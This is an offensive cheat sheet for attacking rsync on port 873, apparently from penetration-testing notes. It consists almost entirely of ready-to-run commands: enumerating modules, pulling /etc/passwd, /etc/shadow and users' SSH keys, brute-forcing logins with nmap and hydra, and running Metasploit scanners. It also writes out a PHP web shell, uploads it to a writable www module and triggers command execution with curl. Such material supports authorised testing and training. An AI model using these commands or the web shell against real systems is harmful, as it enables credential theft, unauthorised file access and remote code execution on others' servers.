# Port 873 - Rsync

## Table of Contents
- [Enumeration](#enumeration)
- [List Modules](#list-modules)
- [File Access](#file-access)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
rsync --list-only rsync://$rhost/ && nmap -p 873 --script "rsync-list-modules" $rhost
```

### Nmap

```shell
nmap -sV -sC -p 873 $rhost
nmap -p 873 --script "rsync-list-modules" $rhost
nmap -p 873 --script "rsync-brute" $rhost
```

### Banner Grabbing

```shell
nc -nv $rhost 873
```

---

## List Modules

### List Available Modules

```shell
# List modules
rsync --list-only rsync://$rhost/

# Nmap script
nmap -p 873 --script "rsync-list-modules" $rhost

# Netcat
nc -nv $rhost 873
#list
```

---

## File Access

### List Files in Module

```shell
# List contents of a module
rsync --list-only rsync://$rhost/module_name/

# Recursive listing
rsync -av --list-only rsync://$rhost/module_name/
```

### Download Files

```shell
# Download single file
rsync -av rsync://$rhost/module_name/file.txt ./

# Download entire module
rsync -av rsync://$rhost/module_name/ ./local_dir/

# With authentication
rsync -av rsync://user@$rhost/module_name/ ./local_dir/
```

### Upload Files

```shell
# Upload file (if writable)
rsync -av ./shell.php rsync://$rhost/module_name/

# With authentication
rsync -av ./shell.php rsync://user@$rhost/module_name/
```

---

## Exploitation

### Access Sensitive Files

```shell
# Common sensitive paths
rsync --list-only rsync://$rhost/etc/
rsync -av rsync://$rhost/etc/passwd ./
rsync -av rsync://$rhost/etc/shadow ./

# SSH keys
rsync -av rsync://$rhost/home/user/.ssh/ ./ssh_keys/
```

### Upload Web Shell

```shell
# If www module is writable
echo '<?php system($_GET["cmd"]); ?>' > shell.php
rsync -av shell.php rsync://$rhost/www/

# Access
curl "http://$rhost/shell.php?cmd=id"
```

### Brute Force

```shell
# Nmap
nmap -p 873 --script "rsync-brute" --script-args userdb=users.txt,passdb=passwords.txt $rhost

# Hydra (if supported)
hydra -L users.txt -P passwords.txt rsync://$rhost
```

### Metasploit

```shell
# List modules
use auxiliary/scanner/rsync/modules_list
set RHOSTS $rhost
run

# Anonymous access check
use auxiliary/scanner/rsync/rsync_file_list
set RHOSTS $rhost
set MODULENAME module_name
run
```

---

## Configuration Files

### Common Locations

```
/etc/rsyncd.conf
/etc/rsyncd.secrets
```

### Config Example

```ini
# rsyncd.conf
[backup]
path = /var/backup
read only = no
auth users = backup_user
secrets file = /etc/rsyncd.secrets
```

---

## Quick Reference

| Command | Description |
| :--- | :--- |
| `rsync --list-only rsync://$rhost/` | List modules |
| `rsync -av rsync://$rhost/module/ ./` | Download module |
| `rsync -av file rsync://$rhost/module/` | Upload file |
| `rsync -av rsync://user@$rhost/module/ ./` | Authenticated access |
